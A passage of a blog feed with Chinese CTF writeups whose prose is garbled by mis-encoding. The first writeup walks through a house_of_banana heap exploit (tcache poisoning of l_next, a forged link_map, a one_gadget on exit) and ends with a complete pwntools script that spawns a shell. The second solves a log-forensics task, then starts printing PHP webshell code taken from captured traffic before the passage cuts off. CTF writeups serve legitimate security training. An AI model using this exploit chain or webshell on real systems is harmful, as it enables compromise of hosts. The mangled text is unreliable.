class="string">&#x27;heap&#x27;</span>,<span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure><p>ç„¶åå¼€å§‹<code>house_of_banana</code>çš„ç¬¬ä¸€æ­¥ï¼Œå…ˆåŠ«æŒ<code>l_next</code>æŒ‡é’ˆã€‚é¦–å…ˆç”³è¯·å›å‰©ä½™çš„<code>unsorted bin</code>ï¼Œç„¶åfree chunk8ã€chunk10å½¢æˆé“¾è¡¨ï¼Œé€šè¿‡<code>UAF</code>çš„<code>chunk7</code>æŒ‡é’ˆæ¥ä¿®æ”¹<code>chunk10_fd</code>ï¼ˆchunk7æ˜¯åŒ…å«chunk10çš„ï¼‰ï¼Œæ³¨æ„ä¿®æ”¹çš„è¯è¦å…ˆå¡«å……<code>0x10</code>ä¸ªå­—ç¬¦ï¼Œå› ä¸ºå‰é¢çš„<code>chunk9</code>åˆ‡å‰²å‡ºäº†<code>0x20</code>ä½œä¸ºæ–°çš„chunkï¼Œå†…å®¹åŒºæ˜¯<code>0x10</code>å¤§å°ï¼Œç„¶åæ‰èƒ½ä¿®æ”¹<code>chunk10_header</code>ï¼Œæ¥ç€ç”³è¯·ä¸¤ä¸ªè·å¾—<code>l_next</code>ï¼Œè¿™é‡Œåˆéœ€è¦æ³¨æ„ï¼Œåœ¨é¢˜ç›®ç»™å‡ºçš„<code>ld</code>å’Œ<code>libc</code>ä¸­ï¼Œè°ƒè¯•å‡ºæ¥<code>l_next</code>çš„åœ°å€æœ«å°¾æ˜¯<code>8</code>ï¼Œè€Œåœ¨æ–°çš„<code>libc</code>ä¸­ï¼Œå †å—æœ‰æ£€æŸ¥åœ°å€å¿…é¡»æ˜¯<code>0x10</code>çš„å€æ•°æ¥è¿›è¡Œå¯¹é½ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥è¿™é‡Œç”³è¯·åˆ°<code>l_next-0x8</code>çš„ä½ç½®è¿›è¡Œå¯¹é½ï¼Œè¦æ³„éœ²å‡º<code>l_next</code>çš„å‰ä¸€ä¸ªåœ°å€ï¼Œåˆ°æ—¶å€™ä¸€èµ·å¡«å……</p><p>å…³äº<code>l_next</code>æ€ä¹ˆæ‰¾çš„é—®é¢˜ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹ï¼Œé¦–å…ˆï¼Œ<code>rtld_global</code>ç»“æ„ä½“æ˜¯åœ¨ldä¸­çš„ï¼Œå¦‚æœé¢˜ç›®æ²¡ç»™å‡ºldçš„è¯éœ€è¦çˆ†ç ´ï¼Œè¿™é“é¢˜çš„è¯æœ‰ldæ‰€ä»¥å°±ä¸å±•å¼€è¯´ï¼Œä½¿ç”¨<code>pwndbg</code>è°ƒè¯•å»æŸ¥<code>rtld_global</code>åŠé™„è¿‘çš„å€¼</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818155214225.png"></p><p>æˆ‘ä»¬è¦ä¿®æ”¹çš„<code>l_next</code>åˆ™æ˜¯åœ¨<code>rtld_global+32</code>å­˜å‚¨çš„åœ°å€é™„è¿‘ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªåœ°å€å‘¢ï¼Ÿæ³¨æ„çœ‹ä¸Šå›¾<code>rtld_global+8</code>è¿™ä¸ªä½ç½®çš„å€¼æ˜¯<code>4</code>ï¼Œè¿™ä¸ªè¡¨ç¤º<code>ns_nloaded = 4</code>, è¿™é‡ŒæŒ‡è¿™ä¸ªé“¾è¡¨çš„èŠ‚ç‚¹ä¸ªæ•°ï¼Œåœ¨<code>exit</code>åé¢åŠ è½½çš„æ£€æŸ¥ä¸­ï¼Œä¼šè¦æ±‚<code>ns_nloaded</code>é“¾è¡¨çš„èŠ‚ç‚¹ä¸å°‘äº<code>3</code>ä¸ªï¼Œè€Œæˆ‘ä»¬åˆ™æ˜¯è¦ä¼ªé€ æˆç¬¬å››ä¸ªèŠ‚ç‚¹ï¼Œæ¯ä¸ªèŠ‚ç‚¹ä¹‹é—´æ˜¯ç”¨<code>l_next</code>æŒ‡é’ˆç›¸è¿æ¥ï¼Œæ‰€ä»¥è¦ä¿®æ”¹ç¬¬ä¸‰ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬ä¼ªè£…å¥½çš„å †å—ä½œä¸ºç¬¬å››ä¸ªèŠ‚ç‚¹</p><p>è€Œç¬¬ä¸‰ä¸ªèŠ‚ç‚¹å°±æ˜¯<code>rtld_global+32</code>å­˜å‚¨çš„åœ°å€ï¼Œç¬¬ä¸‰ä¸ªèŠ‚ç‚¹çš„<code>l_next</code>æŒ‡é’ˆåˆ™æ˜¯åœ¨èŠ‚ç‚¹åœ°å€<code>+0x18</code>ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´å°†ç°åœ¨çš„<code>0x00007f98e2d09a48</code>çš„å€¼æ›¿æ¢æˆæˆ‘ä»¬è¦ä¼ªè£…èŠ‚ç‚¹çš„å †å¤´éƒ¨åœ°å€</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818160349277.png"></p><p>é€šè¿‡<code>tcache poisoning</code>æ§åˆ¶<code>l_next</code>æ”¹æˆè¦ä¼ªè£…èŠ‚ç‚¹çš„å †å¤´éƒ¨åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#tcache poisoning</span><br><span class="line">add(10,0x1e0,1)#7,idx=10</span><br><span class="line">delete(8)</span><br><span class="line">delete(10)</span><br><span class="line">edit(7,b&#x27;a&#x27;*0x10+p64(0)+p64(0x1f1)+p64(key^l_next))</span><br><span class="line">add(10,0x1e0,2)#7,idx=10</span><br><span class="line">add(11,0x1e0,2)#target</span><br><span class="line">edit(11,p64(padding)+p64(heap))</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯<code>house_of_banana</code>çš„ä¸‹ä¸€æ­¥ï¼Œä¼ªé€ èŠ‚ç‚¹çš„å†…å®¹ã€‚è¦è®¾ç½®çš„å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*(fake+<span class="number">0x28</span>)=fakeã€‚</span><br><span class="line">*(fake +<span class="number">0x48</span>)=fake+<span class="number">0x58</span>, *(fake+<span class="number">0x50</span>) = <span class="number">0x8</span></span><br><span class="line">*(fake+<span class="number">0x58</span>) = shell</span><br><span class="line">*(fake+<span class="number">0x110</span>) = fake+<span class="number">0x40</span></span><br><span class="line">*(fake+<span class="number">0x120</span>) = fake+<span class="number">0x48</span></span><br><span class="line">(<span class="built_in">int</span>)*(fake+<span class="number">0x31c</span>) = <span class="number">0x9</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç”±äºé¢˜ç›®çš„é™åˆ¶ï¼Œæ˜¯ä¸èƒ½ç”³è¯·è¶…è¿‡<code>0x200</code>å¤§å°çš„å †å—çš„ï¼Œæ‰€ä»¥åªå¥½ç”³è¯·ä¸¤ä¸ªå †å—æ¥åˆ†å¼€æ„é€ ï¼Œæ³¨æ„æ„é€ ä¸­åç§»é‡ä¸ä¸Šé¢å†…å®¹å°‘<code>0x10</code>çš„åŸå› æ˜¯è¦è®¡ç®—å †å¤´éƒ¨å çš„ç©ºé—´ï¼ˆ0x10å­—èŠ‚ï¼‰ï¼Œå› ä¸ºæˆ‘ä»¬å†™å…¥<code>l_next</code>æ˜¯å†™çš„å †å¤´éƒ¨çš„ä½ç½®çš„åœ°å€è€Œä¸æ˜¯å†…å®¹åŒºçš„åœ°å€ï¼ˆè™½ç„¶ä¹Ÿå¯ä»¥è¿™ä¹ˆåšï¼‰ï¼Œæœ€åä¸€æ­¥æ˜¯é€šè¿‡<code>delete</code>åŠŸèƒ½ä¸­åˆ é™¤å¯¹åº”idxä¸ºç©ºçš„å †å—ï¼ˆåªè¦æ˜¯ç°åœ¨æ²¡åœ¨ä½¿ç”¨çš„<code>idx</code>éƒ½è¡Œï¼‰æ¥æ˜¾å¼è°ƒç”¨<code>exit()</code>è§¦å‘æ”»å‡»æµç¨‹</p><p>ç›´æ¥æ¥çœ‹ä¸‹å †çš„å†…å­˜çŠ¶æ€ï¼ˆä»ç°åœ¨çš„<code>chunk1</code>å¼€å§‹ï¼‰ï¼š</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818162604151.png"></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818163059992.png"></p><p>ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#house of banana</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1f8</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x1f8</span>,<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(heap)</span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x58</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x48</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x1f8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x31c</span>-<span class="number">0x10</span>-<span class="number">0x200</span>)+p8(<span class="number">0x9</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ<code>exit</code>åï¼Œç¨‹åºæ‰§è¡Œæµæ¥åˆ°one_gadgetï¼š<br><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818162349080.png"></p><p>getshellï¼š<br><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818161514074.png"></p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process([<span class="string">&quot;./ld-2.34.so&quot;</span>,<span class="string">&quot;./happy_note&quot;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">&#x27;happy_note&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">one = [<span class="number">0xeacec</span>,<span class="number">0xeacef</span>,<span class="number">0xeacf2</span>]</span><br><span class="line"></span><br><span class="line">menu = <span class="string">b&#x27;&gt;&gt; &#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,t</span>):</span><br><span class="line">p.sendlineafter(menu,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;note:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;[2]&#x27;</span>,<span class="built_in">str</span>(t).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;show?&#x27;</span>,<span class="built_in">str</span>(idx).encode())   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;note:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;content&#x27;</span>,content) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(menu,<span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;note:&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">[add(x,<span class="number">0x200</span>,<span class="number">1</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]<span class="comment">#0-7</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x1e0</span>,<span class="number">1</span>)<span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">[delete(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">backdoor(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219cc0</span></span><br><span class="line">padding = libc_base + <span class="number">0x218bc0</span></span><br><span class="line">l_next = libc_base + <span class="number">0x228088</span> - <span class="number">0x8</span></span><br><span class="line">rtl_global = libc_base + <span class="number">0x266040</span></span><br><span class="line">one_gadget = libc_base + one[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;l_next&#x27;</span>,<span class="built_in">hex</span>(l_next))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak tcache_key</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="number">1</span>)<span class="comment">#7,idx=9</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap = (key&lt;&lt;<span class="number">12</span>)+<span class="number">0x500</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key&#x27;</span>,<span class="built_in">hex</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap&#x27;</span>,<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b calloc\nc&#x27;)</span></span><br><span class="line"><span class="comment">#tcache poisoning</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x1e0</span>,<span class="number">1</span>)<span class="comment">#7,idx=10</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x1f1</span>)+p64(key^l_next))</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x1e0</span>,<span class="number">2</span>)<span class="comment">#7,idx=10</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x1e0</span>,<span class="number">2</span>)<span class="comment">#target</span></span><br><span class="line">edit(<span class="number">11</span>,p64(padding)+p64(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b calloc\nb free\nb *&#x27;+str(hex(one_gadget))+&#x27;\nc&#x27;)</span></span><br><span class="line"><span class="comment">#house of banana</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1f8</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x1f8</span>,<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(heap)</span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x58</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x48</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x1f8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x31c</span>-<span class="number">0x10</span>-<span class="number">0x200</span>)+p8(<span class="number">0x9</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 2022å·…å³°æå®¢ç½‘ç»œå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›åˆèµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬å…­å±Šè“å¸½æ¯å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›åŠå†³èµ›Writeup</title>
      <link href="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/"/>
      <url>/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬å…­å±Šâ€è“å¸½æ¯â€œå…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›åŠå†³èµ›-Writeups"><a href="#ç¬¬å…­å±Šâ€è“å¸½æ¯â€œå…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›åŠå†³èµ›-Writeups" class="headerlink" title="ç¬¬å…­å±Šâ€è“å¸½æ¯â€œå…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›åŠå†³èµ› Writeups"></a>ç¬¬å…­å±Šâ€è“å¸½æ¯â€œå…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨æŠ€èƒ½å¤§èµ›åŠå†³èµ› Writeups</h1><blockquote><p>By ACT Team. 2022.8.4</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-ç¥ç§˜çš„æ—¥å¿—"><a href="#1-ç¥ç§˜çš„æ—¥å¿—" class="headerlink" title="1. ç¥ç§˜çš„æ—¥å¿—"></a>1. ç¥ç§˜çš„æ—¥å¿—</h3><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/1.PNG" alt="æ—¥å¿—"></p><p>ç»™äº†ä¸¤ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œé¦–å…ˆåœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ç­›é€‰IDä¸º6038çš„NTLMèº«ä»½éªŒè¯äº‹ä»¶ï¼Œç„¶åæ ¹æ®ç­›é€‰ç»“æœçš„ç¬¬äºŒæ¡çš„æ—¶é—´2022&#x2F;4&#x2F;17 11:27:06å»å®‰å…¨æ—¥å¿—ä¸­æŸ¥è¯¢ç›¸åŒæ—¶é—´çš„ç™»å½•æ—¥å¿—</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/2.PNG" alt="æ—¥å¿—"></p><p>æ‰¾åˆ°è¿™æ¡ç™»å½•æ—¥å¿—ååœ¨ä¸‹æ–¹çš„è¯¦ç»†ä¿¡æ¯ä¸­å¥–SystemTimeçš„å­—ç¬¦ä¸²å¤åˆ¶è¿›è¡Œmd5è®¡ç®—å°±æ˜¯flagå€¼</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/3.PNG" alt="3"></p><p>flag{dafd0428f634aefd1ddb26f8257c791f}</p><h3 id="2-åŠ å¯†çš„é€šé“"><a href="#2-åŠ å¯†çš„é€šé“" class="headerlink" title="2. åŠ å¯†çš„é€šé“"></a>2. åŠ å¯†çš„é€šé“</h3><p>åˆ†ææµé‡æ•°æ®åŒ…ï¼Œå‘ç°å¤§é©¬ï¼ˆshellè¿æ¥ç®¡ç†å·¥å…·ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span>=@<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;</span><br><span class="line"><span class="variable">$ocwd</span>=<span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="variable">$oparr</span>=<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/;|:/&quot;</span>,<span class="variable">$opdir</span>);</span><br><span class="line">@<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>,<span 